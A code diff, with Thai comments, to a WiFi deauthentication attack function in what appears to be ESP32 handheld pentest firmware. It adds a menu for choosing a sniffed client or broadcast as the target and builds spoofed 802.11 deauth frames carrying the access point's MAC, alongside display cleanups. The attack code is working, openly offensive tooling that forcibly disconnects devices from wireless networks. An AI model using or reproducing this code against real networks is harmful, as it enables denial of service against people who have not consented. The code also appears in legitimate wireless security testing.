@@ -840,6 +840,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
+    // เตรียม BSSID
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &g_targetBssid[0], &g_targetBssid[1], &g_targetBssid[2],
            &g_targetBssid[3], &g_targetBssid[4], &g_targetBssid[5]);
@@ -849,31 +850,119 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     memcpy(target_ap.bssid, g_targetBssid, 6);
     target_ap.primary = channel;
 
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
-
+    // Client monitoring (เริ่มดักจับ client ก่อนเพื่อใช้ในเมนู)
     g_clients.clear();
     esp_wifi_set_promiscuous_rx_cb(promisc_callback);
     esp_wifi_set_promiscuous(true);
 
+    // รอให้มี client บ้าง (อย่างน้อย 2 วินาที) แต่ไม่บังคับ
+    delay(2000);
+
+    // ═══════════════════════════════════
+    //  เมนูเลือก Client เป้าหมาย
+    // ═══════════════════════════════════
+    uint8_t *targetClientMac = nullptr;   // nullptr = broadcast
+    String clientName = "Broadcast";
+
+    // สร้างรายการ client (รวม broadcast)
+    std::vector<String> clientNames;
+    std::vector<uint8_t*> clientMacs;
+    clientNames.push_back("All Clients (Broadcast)");
+    clientMacs.push_back(nullptr);
+
+    for (auto &c : g_clients) {
+        if (!c.active) continue;
+        char macstr[18];
+        snprintf(macstr, sizeof(macstr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
+        String oui = getOUI(c.mac);
+        String name = String(macstr);
+        if (oui.length() > 0) name += " (" + oui + ")";
+        clientNames.push_back(name);
+        clientMacs.push_back(c.mac);
+    }
+
+    int selected = 0;
+    bool chose = false;
+
+    while (!chose) {
+        // วาดหน้าจอเมนู
+        tft.fillScreen(bruceConfig.bgColor);
+        tft.setTextSize(1);
+        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+        tft.setCursor(4, 10);
+        tft.println("Select Client Target:");
+        tft.drawLine(0, 24, tftWidth, 24, TFT_DARKGREY);
+
+        int y = 30;
+        for (int i = 0; i < clientNames.size(); i++) {
+            if (i == selected) {
+                tft.fillRect(4, y - 1, tftWidth - 8, 14, TFT_NAVY);
+                tft.setTextColor(TFT_WHITE, TFT_NAVY);
+            } else {
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            }
+            tft.setCursor(10, y);
+            tft.print(clientNames[i]);
+            y += 16;
+            if (y > tftHeight - 30) break;
+        }
+
+        // ตรวจสอบปุ่ม
+        if (check(NextPress)) {
+            selected = (selected + 1) % clientNames.size();
+            delay(150);
+        }
+        if (check(PrevPress)) {
+            selected = (selected - 1 + clientNames.size()) % clientNames.size();
+            delay(150);
+        }
+        if (check(SelPress)) {
+            chose = true;
+        }
+        if (EscPress) {
+            // ยกเลิก
+            esp_wifi_set_promiscuous(false);
+            esp_wifi_set_promiscuous_rx_cb(NULL);
+            wifi_atk_unsetWifi();
+            returnToMenu = true;
+            return;
+        }
+        delay(50);
+    }
+
+    // ตั้งค่าเป้าหมายที่เลือก
+    targetClientMac = clientMacs[selected];
+    clientName = clientNames[selected];
+
+    // ═══════════════════════════════════
+    //  เริ่ม Deauth attack
+    // ═══════════════════════════════════
+
+    // สร้าง deauth frame
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    if (targetClientMac == nullptr) {
+        memcpy(&deauth_frame[4], _default_target, 6); // broadcast
+    } else {
+        memcpy(&deauth_frame[4], targetClientMac, 6); // client เฉพาะ
+    }
+    memcpy(&deauth_frame[10], g_targetBssid, 6); // AP MAC (source)
+    memcpy(&deauth_frame[16], g_targetBssid, 6); // BSSID
+
+    // Layout constants (ไม่มี GRAPH_H)
     const uint8_t TOP_MARGIN = 2;
-    const uint8_t INFO_H = 60;                // ไม่มีกราฟ จึงใช้ความสูงปกติ
+    const uint8_t INFO_H = 60;
     const uint8_t CLIENT_HEADER_H = 14;
     const uint8_t ROW_H = 14;
-    const uint8_t MAX_ROWS = 6;               // คืนเป็น 6 แถว เพราะมีพื้นที่มากขึ้น
+    const uint8_t MAX_ROWS = 6;
     const uint8_t TABLE_Y = TOP_MARGIN + INFO_H + CLIENT_HEADER_H;
 
     uint32_t lastUIUpdate = 0;
     uint16_t count = 0;
     uint32_t totalFrames = 0;
     unsigned long startTime = millis();
-    bool isPaused = true;
+    bool isPaused = true;            // เริ่มต้น OFF
     bool lastSel = false;
-
-    static uint8_t apScrollOffset = 0;
-    static uint8_t macScrollOffset = 0;
-    unsigned long lastScrollUpdate = 0;
-    const unsigned long SCROLL_INTERVAL_MS = 800;
 
     unsigned long lastFooterUpdate = 0;
     const unsigned long FOOTER_UPDATE_MS = 500;
@@ -918,22 +1007,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             delay(50);
         }
 
-        if (millis() - lastScrollUpdate > SCROLL_INTERVAL_MS) {
-            lastScrollUpdate = millis();
-            if (tssid.length() > 18) {
-                apScrollOffset = (apScrollOffset + 1) % (tssid.length() - 17);
-            }
-            if (mac.length() > 13) {
-                macScrollOffset = (macScrollOffset + 1) % (mac.length() - 12);
-            }
-            for (auto &c : g_clients) {
-                char macShort[10]; snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X", c.mac[0], c.mac[1], c.mac[2]);
-                String oui = getOUI(c.mac); String full = String(macShort); if (oui.length()>0) full += " " + oui;
-                if (full.length() > 18) {
-                    c.scrollOffset = (c.scrollOffset + 1) % (full.length() - 17);
-                } else c.scrollOffset = 0;
-            }
-        }
+        // ---- ไม่มี scroll offset update อีกต่อไป ----
 
         if (millis() - lastCleanupTime > CLEANUP_INTERVAL_MS) {
             lastCleanupTime = millis();
@@ -977,30 +1051,32 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             int16_t yLeft = TOP_MARGIN + 4, yRight = TOP_MARGIN + 4;
 
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            {
-                String apFull = "AP: " + tssid;
-                String apDisp = apFull;
-                if (tssid.length() > 18) apDisp = "AP: " + tssid.substring(apScrollOffset, apScrollOffset + 18);
-                tft.drawString(apDisp, leftX, yLeft, 1); yLeft += 12;
-            }
-            {
-                String macFull = "MAC: " + mac;
-                String macDisp = macFull;
-                if (mac.length() > 13) macDisp = "MAC: " + mac.substring(macScrollOffset, macScrollOffset + 13);
-                tft.drawString(macDisp, leftX, yLeft, 1); yLeft += 12;
-            }
+
+            // ---- แสดง AP (ตัดหางถ้ายาวเกิน 18 ตัวอักษร) ----
+            String apDisplay = "AP: " + tssid;
+            if (apDisplay.length() > 18) apDisplay = apDisplay.substring(0, 17) + "~";
+            tft.drawString(apDisplay, leftX, yLeft, 1); yLeft += 12;
+
+            // ---- แสดง MAC (ตัดหางถ้ายาวเกิน 13 ตัวอักษร) ----
+            String macDisplay = "MAC: " + mac;
+            if (macDisplay.length() > 13) macDisplay = macDisplay.substring(0, 12) + "~";
+            tft.drawString(macDisplay, leftX, yLeft, 1); yLeft += 12;
+
             tft.drawString("Ch: " + String(channel) + " (" + String(2400+channel) + "MHz)", leftX, yLeft, 1); yLeft += 12;
+
             int fpsValue = count / 2;
             uint16_t fpsColor = (fpsValue > 3000) ? TFT_GREEN : (fpsValue > 1000) ? TFT_YELLOW : TFT_RED;
             tft.setTextColor(fpsColor, bruceConfig.bgColor);
             tft.drawString("FPS: " + String(fpsValue), leftX, yLeft, 1);
 
+            // ---- คอลัมน์ขวา ----
             yRight = TOP_MARGIN + 4;
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
             unsigned long elapsed = (millis() - startTime) / 1000;
             char timeBuf[10]; snprintf(timeBuf, sizeof(timeBuf), "%02lu:%02lu", elapsed/60, elapsed%60);
             tft.drawString("Time: " + String(timeBuf), rightX, yRight, 1); yRight += 12;
 
+            // Deauth indicator + จุดกะพริบ
             tft.drawString("Deauth:", rightX, yRight, 1);
             uint16_t circleX = rightX + 52, circleY = yRight + 6;
             if (!isPaused && (millis() / 500) % 2) tft.fillCircle(circleX, circleY, 3, TFT_GREEN);
@@ -1008,21 +1084,27 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             tft.drawString(isPaused ? "OFF" : "ON", rightX + 60, yRight, 1);
             yRight += 12;
 
+            // Target client
+            String targetStr = "Tgt: " + clientName;
+            if (targetStr.length() > 22) targetStr = targetStr.substring(0, 21) + "~";
+            tft.drawString(targetStr, rightX, yRight, 1); yRight += 12;
+
             int activeCount = 0;
             for (auto &c : g_clients) if (c.active) activeCount++;
             tft.drawString("Clients: " + String(activeCount), rightX, yRight, 1); yRight += 12;
             tft.drawString("Total: " + String(totalFrames), rightX, yRight, 1);
 
-            // ═══════ ไม่มี Waterfall อีกต่อไป ═══════
-            // เส้นคั่นเบา ๆ เหนือ Client Table
+            // เส้นคั่น
             tft.drawFastHLine(0, TABLE_Y - 1, tftWidth, TFT_DARKGREY);
 
+            // ----- Client Table Header -----
             uint8_t tableY = TABLE_Y;
             tft.fillRect(0, tableY, tftWidth, CLIENT_HEADER_H, TFT_NAVY);
             tft.setTextColor(TFT_WHITE, TFT_NAVY);
             tft.drawString("CLIENT MAC / OUI", leftX + 2, tableY + 1, 1);
             tft.drawString("SEEN", rightX + 10, tableY + 1, 1);
 
+            // ----- Client Rows (ไม่มี scroll, แสดง MAC สั้น + OUI) -----
             tableY += CLIENT_HEADER_H;
             int shown = 0;
             for (auto &c : g_clients) {
@@ -1031,16 +1113,16 @@ void target_atk(String tssid, String mac, uint8_t channel) {
                 uint16_t rowBg = (shown % 2 == 0) ? bruceConfig.bgColor : TFT_DARKGREY;
                 tft.fillRect(0, rowY, tftWidth, ROW_H, rowBg);
 
-                char macShort[10]; snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X", c.mac[0], c.mac[1], c.mac[2]);
+                char macShort[10];
+                snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X", c.mac[0], c.mac[1], c.mac[2]);
                 String oui = getOUI(c.mac);
-                String fullClient = String(macShort); if (oui.length() > 0) fullClient += " " + oui;
-                String clientDisplay;
-                if (fullClient.length() > 18) {
-                    clientDisplay = fullClient.substring(c.scrollOffset, c.scrollOffset + 18);
-                } else clientDisplay = fullClient;
+                String clientLine = String(macShort);
+                if (oui.length() > 0) clientLine += " " + oui;
+                // ตัดถ้ายาวเกิน 18
+                if (clientLine.length() > 18) clientLine = clientLine.substring(0, 17) + "~";
 
                 tft.setTextColor(TFT_WHITE, rowBg);
-                tft.drawString(clientDisplay, leftX + 4, rowY + 1, 1);
+                tft.drawString(clientLine, leftX + 4, rowY + 1, 1);
                 tft.setTextColor(TFT_YELLOW, rowBg);
                 tft.drawString(String((millis() - c.last_seen) / 1000) + "s", rightX + 12, rowY + 1, 1);
                 shown++;
@@ -1050,6 +1132,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         }
     }
 
+    // cleanup
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
     wifi_atk_unsetWifi();
